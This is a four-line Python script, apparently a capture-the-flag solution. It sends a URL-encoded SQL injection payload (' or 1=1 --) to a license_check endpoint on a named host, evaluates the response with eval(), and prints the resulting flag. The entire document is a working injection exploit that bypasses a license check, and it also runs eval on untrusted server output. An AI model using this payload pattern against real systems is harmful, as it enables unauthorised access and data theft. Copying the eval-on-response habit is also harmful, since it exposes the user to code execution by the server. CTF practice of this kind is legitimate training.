import requests
r=requests.get("https://euler.dragonsec.si/license_check?license_key=%27%20or%201%3D1%20--%20")
flag=eval(r.text)[0][0]
print(flag)
